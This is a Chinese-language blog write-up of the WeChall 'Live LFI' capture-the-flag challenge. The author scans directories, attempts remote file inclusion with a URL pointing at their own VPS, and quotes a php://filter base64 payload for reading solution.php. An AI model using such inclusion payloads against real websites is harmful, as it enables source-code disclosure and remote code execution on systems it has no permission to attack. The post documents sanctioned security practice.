---

categories:
- CTF
tags: 
    - web
---

题目地址：http://www.wechall.net/challenge/warchall/live_lfi/index.php
如题目所提示，是PHP文件包含漏洞。
访问给出的题目地址，网页提示“网站正在建设中”

## 扫描目录
和所有web漏洞一样，先dirbuster扫描一下
![2](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/2.PNG)

---

test.php报错
 
![3](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/3.PNG)
require_once()语句在脚本执行期间包含并运行指定文件
/home/level/14_live_fi/www/test.php不是一个目录，然后报错了。

>info1:网站所在目录路径： **/home/level/14_live_fi/www/**

---

## 猜解参数
猜测应该是远程文件包含remote file include，于是访问rfi.php发现页面是空白。
![5](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/5.PNG)

因为看不到源码，所以只能爆破试试。
发现cmd是可能的命令参数。
`/temp/rfi.php?cmd=http://127.0.0.1:80/test.php`
![6](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/6.PNG)
查看源代码，多了`<pre></pre>`这个字符串。

访问`/temp/rfi.php?cmd=http://vps的ip:888/whale.php`
![访问本地文件](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/7.PNG)
远程文件包含似乎没有成功。

所以搞不懂cmd这个参数到底怎么用。

## 重新扫描
找不到线索，于是重新扫描

>info2: 整理下已知网站目录
http://lfi.warchall.net/protected/
http://lfi.warchall.net/temp/

`http://lfi.warchall.net/protected/logs/20180905_critical_details.txt`
可以分析出，log目录下，记录了来自各地的尝试文件包含的攻击记录。
![8](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/8.PNG)
而这个攻击记录，则表明，文件包含使用的是require_once()这个函数
而漏洞指明了index.php 的第11行。

## 线索

![查看源码](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/9.PNG)

于是我返回了index.php
![10](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/10.PNG)

现在考虑一下，题目意思是什么，本地文件包含通常会泄露敏感信息。
然后下一步就是找flag了吧
![11](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/11.PNG)

找不到flag所在的路径啊！好气

## writeup
[writeup](https://joizel.readthedocs.io/ko/latest/wargame/web/[wechall]%20Warchall_Live%20LFI.html)
看了一些wp，发现解题思路是这样的：solution.php因为是脚本文件，所以客户端是不能直接查看的。

要通过以下协议，将php编码一下再查看。`?lang=php://filter/convert.base64-encode/resource=solution.php"`

按照wp，这道题其实坏了，得不出flag的。有点坑。
![12](https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/1007/12.PNG)



